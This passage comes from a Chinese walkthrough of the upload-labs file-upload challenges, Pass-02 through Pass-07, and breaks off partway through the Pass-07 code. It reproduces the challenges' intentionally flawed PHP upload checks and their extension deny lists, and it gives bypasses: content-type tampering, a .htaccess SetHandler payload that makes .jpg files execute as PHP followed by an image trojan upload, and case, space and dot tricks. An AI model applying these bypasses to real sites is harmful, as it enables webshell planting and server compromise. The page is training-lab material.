class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jpg 改包为 php，成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306142420671.png" alt="image-20210306142420671"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306142449990.png" alt="image-20210306142449990"></p><h2 id="pass-03php后缀上传"><a class="markdownIt-Anchor" href="#pass-03php后缀上传">#</a> Pass-03 (php 后缀上传)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306142652858.png" alt="image-20210306142652858"></p><p>成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306142712846.png" alt="image-20210306142712846"></p><h2 id="pass-04htaccess上传"><a class="markdownIt-Anchor" href="#pass-04htaccess上传">#</a> Pass-04 (.htaccess 上传)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先进行上传.htaccess一句话，在上传图片木马</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;*.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306143049283.png" alt="image-20210306143049283"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306143106452.png" alt="image-20210306143106452"></p><p>在进行上传图片木马</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306143124871.png" alt="image-20210306143124871"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306143142936.png" alt="image-20210306143142936"></p><h2 id="pass-05大小写绕过"><a class="markdownIt-Anchor" href="#pass-05大小写绕过">#</a> Pass-05 (大小写绕过)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311193803467.png" alt="image-20210311193803467"></p><p>成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311193819330.png" alt="image-20210311193819330"></p><h2 id="pass-06空格绕过"><a class="markdownIt-Anchor" href="#pass-06空格绕过">#</a> Pass-06（空格绕过）</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311194014038.png" alt="image-20210311194014038"></p><p>成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311194100032.png" alt="image-20210311194100032"></p><h2 id="pass-07点绕过"><a class="markdownIt-Anchor" href="#pass-07点绕过">#</a> Pass-07（点绕过）</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span 